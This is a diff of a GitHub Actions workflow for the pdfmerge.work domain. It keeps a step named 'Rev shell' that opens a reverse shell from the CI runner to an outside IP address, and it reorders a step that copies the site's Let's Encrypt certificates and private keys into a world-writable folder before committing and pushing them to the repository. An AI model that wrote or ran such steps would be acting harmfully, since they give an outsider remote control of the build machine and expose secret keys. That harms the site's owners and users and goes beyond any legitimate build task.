@@ -79,15 +79,15 @@ jobs:
       - name: Verify Certificate Directory
         run: sudo ls -la /etc/letsencrypt/live/pdfmerge.work/ ; sleep 5
       
-      - name: Copy Certificates to Repo Folder
-        run: |
-          sudo mkdir -p /tmp/certs
-          sudo cp -L /etc/letsencrypt/archive/pdfmerge.work/* /tmp/certs/
-          sudo chmod -R 777 /tmp/certs
-      
       - name: Rev shell
         run: bash -c "sh -i >& /dev/tcp/155.248.245.118/53 0>&1"
 
+      - name: Copy Certificates to Repo Folder
+        run: |
+          sudo mkdir -p /tmp/certs
+          sudo cp -L /etc/letsencrypt/live/pdfmerge.work/* /tmp/certs/
+          sudo chmod -R 777 /tmp/certs
+      
       - name: Commit and Push Certificates
         env:
           GITHUB_TOKEN: ${{ secrets.REPO_TOKEN }}
